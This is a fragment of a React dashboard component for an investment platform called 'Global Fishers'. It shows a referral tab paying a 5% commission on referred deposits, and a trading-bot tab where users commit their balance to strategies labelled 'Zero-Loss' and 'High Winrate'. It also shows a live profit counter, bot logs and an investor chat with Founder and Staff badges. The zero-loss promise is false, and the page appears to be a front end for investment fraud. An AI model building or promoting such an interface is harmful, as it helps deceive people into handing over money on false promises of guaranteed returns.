                <h2 className="text-2xl font-black mb-6 flex items-center gap-3">
                  <div className="p-3 bg-emerald-500/10 rounded-2xl text-emerald-400">
                    <Share2 size={24} />
                  </div>
                  Network Expansion
                </h2>
                
                <p className="text-slate-400 text-sm leading-relaxed mb-8">
                  Invite fellow investors to the Global Fishers elite network. Receive a <span className="text-emerald-400 font-bold">5% commission</span> on every initial capital deployment made by your direct referrals.
                </p>

                <div className="space-y-4">
                  <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-[0.2em] ml-1">Your Unique Referral Link</label>
                  <div className="flex items-center gap-3 p-2 bg-slate-950/50 border border-slate-800 rounded-2xl">
                    <code className="flex-1 px-4 text-xs text-emerald-400 truncate font-mono">
                      https://global-fishers.com/signup?ref={user?.id?.slice(0, 8) || 'GF-NETWORK'}
                    </code>
                    <button 
                      onClick={() => {
                        navigator.clipboard.writeText(`https://global-fishers.com/signup?ref=${user?.id?.slice(0, 8) || 'GF-NETWORK'}`);
                        toast.success('Referral link copied to clipboard');
                      }}
                      className="p-4 bg-emerald-500 text-white rounded-xl hover:bg-emerald-400 transition shadow-lg shadow-emerald-500/20"
                    >
                      <Copy size={18} />
                    </button>
                  </div>
                </div>
              </div>

              <div className="space-y-6">
                <div className="p-8 rounded-[2rem] glass-effect-dark border border-slate-800">
                  <h3 className="text-sm font-bold text-slate-400 uppercase tracking-[0.2em] mb-6 flex items-center gap-2">
                    <Users size={16} className="text-emerald-400" /> Network Statistics
                  </h3>
                  <div className="grid grid-cols-2 gap-6">
                    <div>
                      <div className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-1">Active Referrals</div>
                      <div className="text-2xl font-black text-white">0</div>
                    </div>
                    <div>
                      <div className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-1">Total Rewards</div>
                      <div className="text-2xl font-black text-emerald-400">€0.00</div>
                    </div>
                  </div>
                </div>

                <div className="p-8 rounded-[2rem] bg-emerald-500/5 border border-emerald-500/20">
                  <h3 className="text-xs font-bold text-emerald-400 uppercase tracking-[0.2em] mb-3">Institutional Benefit</h3>
                  <p className="text-xs text-slate-400 leading-relaxed">
                    Commissions are instantly credited to your available balance upon successful verification and deposit of your referred partners.
                  </p>
                </div>
              </div>
            </div>
          </motion.div>
        )}

        {activeTab === 'bot-terminal' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-8">
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
              
              {/* Bot Control Card */}
              <div className="p-8 rounded-3xl bg-slate-800/30 border border-slate-700 flex flex-col justify-between">
                <div>
                  <h2 className="text-xl font-bold mb-6 flex items-center gap-2 font-serif text-emerald-400">
                    <Settings size={20} className="animate-spin-slow" /> Bot Configuration
                  </h2>

                  {/* Fund Source Selection */}
                  <div className="mb-6">
                    <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-[0.2em] mb-3 ml-1">Capital Funding Source</label>
                    <div className="grid grid-cols-2 gap-4">
                      <button
                        onClick={() => !isBotRunning && setBotSource('balance')}
                        disabled={isBotRunning}
                        className={`p-4 rounded-2xl border text-left transition ${
                          botSource === 'balance'
                            ? 'border-emerald-500/50 bg-emerald-500/5 text-white'
                            : 'border-slate-800 bg-slate-900/30 text-slate-400 hover:border-slate-700'
                        }`}
                      >
                        <div className="text-xs font-bold uppercase tracking-widest text-slate-500">Balance</div>
                        <div className="text-lg font-black mt-1 text-white">€{(profile?.balance ?? 0).toLocaleString()}</div>
                      </button>

                      <button
                        onClick={() => !isBotRunning && setBotSource('profit')}
                        disabled={isBotRunning}
                        className={`p-4 rounded-2xl border text-left transition ${
                          botSource === 'profit'
                            ? 'border-emerald-500/50 bg-emerald-500/5 text-white'
                            : 'border-slate-800 bg-slate-900/30 text-slate-400 hover:border-slate-700'
                        }`}
                      >
                        <div className="text-xs font-bold uppercase tracking-widest text-slate-500">Profit</div>
                        <div className="text-lg font-black mt-1 text-white">€{(profile?.profit ?? 0).toLocaleString()}</div>
                      </button>
                    </div>
                  </div>

                  {/* Strategy Selection */}
                  <div className="mb-6">
                    <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-[0.2em] mb-3 ml-1">Trading Strategy</label>
                    <select
                      value={botStrategy}
                      onChange={e => setBotStrategy(e.target.value)}
                      disabled={isBotRunning}
                      className="w-full px-4 py-3.5 bg-slate-900 border border-slate-800 rounded-2xl text-white text-sm focus:outline-none focus:ring-2 focus:ring-emerald-500/50 transition"
                    >
                      <option value="institutional">Institutional Neural FX (Zero-Loss)</option>
                      <option value="hft">HFT Micro-Scalper (High Winrate)</option>
                      <option value="grid">Grid Oscillating Quant (Conservative)</option>
                    </select>
                  </div>

                  {/* Capital Input */}
                  <div className="mb-8">
                    <label className="block text-[10px] font-bold text-slate-500 uppercase tracking-[0.2em] mb-3 ml-1">Allocation Capital (EUR)</label>
                    <div className="relative">
                      <span className="absolute left-5 top-1/2 -translate-y-1/2 text-slate-500 font-bold">€</span>
                      <input
                        type="number"
                        value={botCapital}
                        onChange={e => setBotCapital(e.target.value)}
                        disabled={isBotRunning}
                        placeholder="Enter amount to deploy"
                        className="w-full pl-10 pr-5 py-4 bg-slate-900 border border-slate-800 rounded-2xl text-white font-mono placeholder-slate-700 focus:outline-none focus:ring-2 focus:ring-emerald-500/50 transition"
                      />
                    </div>
                    {!isBotRunning && (
                      <div className="flex gap-2 mt-3">
                        {[0.25, 0.5, 0.75, 1.0].map((pct, i) => (
                          <button
                            key={i}
                            onClick={() => {
                              const base = botSource === 'balance' ? (profile?.balance ?? 0) : (profile?.profit ?? 0);
                              setBotCapital(Math.floor(base * pct).toString());
                            }}
                            className="flex-1 py-1.5 bg-slate-900 border border-slate-800 rounded-lg text-[10px] font-bold text-slate-400 hover:border-slate-700 hover:text-white transition"
                          >
                            {pct * 100}%
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                </div>

                {/* Deploy Button */}
                <button
                  onClick={handleDeployBot}
                  className={`w-full py-5 rounded-2xl font-black text-sm uppercase tracking-[0.2em] flex items-center justify-center gap-3 transition-all duration-300 shadow-xl
                    ${isBotRunning 
                      ? 'bg-red-500 hover:bg-red-600 text-white shadow-red-500/20' 
                      : 'bg-emerald-500 hover:bg-emerald-400 text-white shadow-emerald-500/20'}`}
                >
                  {isBotRunning ? (
                    <>
                      <Square size={16} fill="white" /> Terminate Bot Terminal
                    </>
                  ) : (
                    <>
                      <Play size={16} fill="white" /> Deploy Trading Bot
                    </>
                  )}
                </button>
              </div>

              {/* Bot Live Forex Chart */}
              <div className="lg:col-span-2 p-8 rounded-3xl bg-slate-800/30 border border-slate-700 flex flex-col justify-between">
                <div>
                  <div className="flex items-center justify-between mb-8">
                    <h2 className="text-xl font-bold flex items-center gap-2 font-serif text-emerald-400">
                      <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-ping"></div> Live Forex Feed (M1)
                    </h2>
                    
                    {/* Live Stats */}
                    <div className="flex items-center gap-6">
                      <div className="text-right">
                        <div className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Active Profit</div>
                        <div className="text-xl font-black text-emerald-400 font-mono">
                          +€{botProfit.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-[10px] font-bold text-slate-500 uppercase tracking-widest">Total Trades</div>
                        <div className="text-xl font-black text-white font-mono">{totalTrades}</div>
                      </div>
                    </div>
                  </div>

                  <div className="h-[250px] w-full mb-4">
                    <ResponsiveContainer width="100%" height="100%">
                      <AreaChart data={liveChartData}>
                        <defs>
                          <linearGradient id="colorValueLive" x1="0" y1="0" x2="0" y2="1">
                            <stop offset="5%" stopColor="#10b981" stopOpacity={0.2}/>
                            <stop offset="95%" stopColor="#10b981" stopOpacity={0}/>
                          </linearGradient>
                        </defs>
                        <CartesianGrid strokeDasharray="3 3" stroke="#1e293b" vertical={false} />
                        <XAxis dataKey="time" stroke="#475569" fontSize={10} tickLine={false} axisLine={false} />
                        <YAxis stroke="#475569" fontSize={10} tickLine={false} axisLine={false} domain={['auto', 'auto']} tickFormatter={(v) => v.toFixed(4)} />
                        <Tooltip 
                          contentStyle={{ backgroundColor: '#0f172a', border: '1px solid #1e293b', borderRadius: '12px' }}
                          labelStyle={{ color: '#64748b' }}
                          itemStyle={{ color: '#10b981' }}
                        />
                        <Area type="monotone" dataKey="price" stroke="#10b981" strokeWidth={2} fillOpacity={1} fill="url(#colorValueLive)" />
                      </AreaChart>
                    </ResponsiveContainer>
                  </div>
                </div>

                <div className="flex flex-wrap items-center justify-between pt-4 border-t border-slate-800 text-xs text-slate-500">
                  <span>Instrument: EUR/USD</span>
                  <span>Execution Gateway: Frankfurt LD4 Pool</span>
                  <span>Safety Status: Failsafe Active</span>
                </div>
              </div>

            </div>

            {/* Logs & Chat Grid */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
              
              {/* Bot System Logs */}
              <div className="lg:col-span-2 p-8 rounded-3xl bg-slate-800/30 border border-slate-700 flex flex-col h-[400px]">
                <h3 className="text-base font-bold mb-4 flex items-center gap-2 font-serif text-emerald-400">
                  <Terminal size={16} /> Bot Terminal Live Feed
                </h3>
                <div className="flex-1 bg-slate-950/80 border border-slate-800 rounded-2xl p-5 font-mono text-xs text-slate-300 overflow-y-auto space-y-2.5 no-scrollbar">
                  {botLogs.map((log, i) => (
                    <div key={i} className={`leading-relaxed ${
                      log.includes('[SYSTEM]') ? 'text-blue-400 font-bold' :
                      log.includes('[CONNECT]') ? 'text-amber-400' :
                      log.includes('realized') ? 'text-emerald-400 font-bold' : 'text-slate-300'
                    }`}>
                      {log}
                    </div>
                  ))}
                </div>
              </div>

              {/* Trading Chat Room */}
              <div className="p-8 rounded-3xl bg-slate-800/30 border border-slate-700 flex flex-col h-[400px]">
                <h3 className="text-base font-bold mb-4 flex items-center gap-2 font-serif text-emerald-400">
                  <MessageSquare size={16} /> Investor Lounge Chat
                </h3>
                
                {/* Chat Feed */}
                <div className="flex-1 overflow-y-auto space-y-4 mb-4 pr-1 no-scrollbar">
                  {chatMessages.map((msg, i) => (
                    <div key={i} className="flex items-start gap-3">
                      <div className="w-8 h-8 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-xs font-black text-emerald-400 uppercase">
                        {msg.sender[0]}
                      </div>
                      <div className="flex-1 bg-slate-900/40 border border-slate-800/60 rounded-2xl p-3">
                        <div className="flex items-center justify-between mb-1">
                          <span className="font-bold text-xs text-white flex items-center gap-2">
                            {msg.sender}
                            {msg.badge && (
                              <span className={`px-2 py-0.5 rounded text-[8px] font-black uppercase tracking-wider ${
                                msg.badge === 'You' ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/10' :
                                msg.badge === 'Founder' ? 'bg-amber-500/20 text-amber-400 border border-amber-500/10' :
                                msg.badge === 'Staff' ? 'bg-blue-500/20 text-blue-400 border border-blue-500/10' :
                                'bg-slate-700/35 text-slate-400'
                              }`}>
                                {msg.badge}
                              </span>
                            )}
                          </span>
                          <span className="text-[9px] text-slate-500 font-medium">{msg.time}</span>
                        </div>
                        <p className="text-xs text-slate-400 leading-relaxed font-medium">{msg.message}</p>
                      </div>
                    </div>
                  ))}
                </div>

                {/* Chat Input Form */}
                <form onSubmit={handleSendMessage} className="flex gap-2">
                  <input
                    type="text"
                    value={chatInput}
                    onChange={e => setChatInput(e.target.value)}
                    placeholder="Contribute to conversation..."
                    className="flex-1 px-4 py-3 bg-slate-900 border border-slate-800 rounded-xl text-xs text-white placeholder-slate-700 focus:outline-none focus:ring-1 focus:ring-emerald-500/50 transition font-medium"
                  />
                  <button
                    type="submit"
                    className="px-4 py-3 bg-emerald-500 text-white rounded-xl font-bold text-xs hover:bg-emerald-400 transition"
                  >
                    Send
                  </button>
                </form>

              </div>

            </div>
          </motion.div>
        )}
      </div>
    </div>
  );
}
